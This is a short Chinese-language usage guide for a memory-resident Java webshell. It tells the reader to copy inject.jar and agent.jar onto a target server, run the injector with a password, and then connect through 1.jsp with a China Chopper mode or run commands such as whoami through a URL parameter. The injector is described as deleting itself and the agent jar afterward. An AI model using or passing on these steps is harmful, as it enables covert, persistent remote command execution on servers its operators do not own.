将release中的inject.jar agent.jar复制目标服务器。

运行inject.jar:

(测试时注意备份，会删除自身和agent.jar)

```jsp
java -jar inject.jar 123
```

连接内存马：
```jsp
http://ip:port/1.jsp?pass_the_world=123&model=chopper
```

执行命令：
```jsp
http://ip:port/1.jsp?pass_the_world=123&model=exec&cmd=whoami
```
